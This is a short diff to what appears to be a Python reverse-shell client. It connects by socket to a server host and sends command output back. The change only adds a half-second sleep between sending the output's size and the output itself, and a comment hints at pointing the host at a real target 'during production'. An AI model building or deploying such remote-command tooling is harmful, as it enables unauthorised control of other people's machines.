@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import sys
+import time
 
 # Set IP address and PORT to the server
 SERVER_HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
@@ -51,6 +52,7 @@ while True:
 
             # Send back the output
             client.send(str(sys.getsizeof(getOutput)).encode())
+            time.sleep(0.5)
             client.send(getOutput)
 
 # client.close()
